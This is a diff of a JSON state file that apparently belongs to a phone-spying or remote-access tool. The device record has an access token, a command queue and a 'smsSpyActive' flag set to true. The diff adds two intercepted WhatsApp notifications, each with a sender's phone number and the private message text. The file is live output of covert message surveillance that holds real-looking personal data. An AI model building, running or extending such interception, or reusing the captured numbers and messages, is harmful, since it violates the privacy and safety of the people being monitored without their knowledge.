@@ -2149,7 +2149,7 @@
     "deviceName": "HP-USERNAME-AE7B",
     "ownerUsername": "akbarr",
     "token": "623c8ef953430e19b414a0b6d6fea805",
-    "lastSeen": 1777690272943,
+    "lastSeen": 1777690284920,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T02:24:28.761Z",
@@ -2165,6 +2165,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 831-8704-9784",
+        "content": "Sabar ya kubuat",
+        "time": "02/05 09:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777690287143
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 831-8704-9784",
+        "content": "Sabar ya kubuat",
+        "time": "02/05 09:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777690287055
+      },
       {
         "appName": "WhatsApp",
         "sender": "Asa",
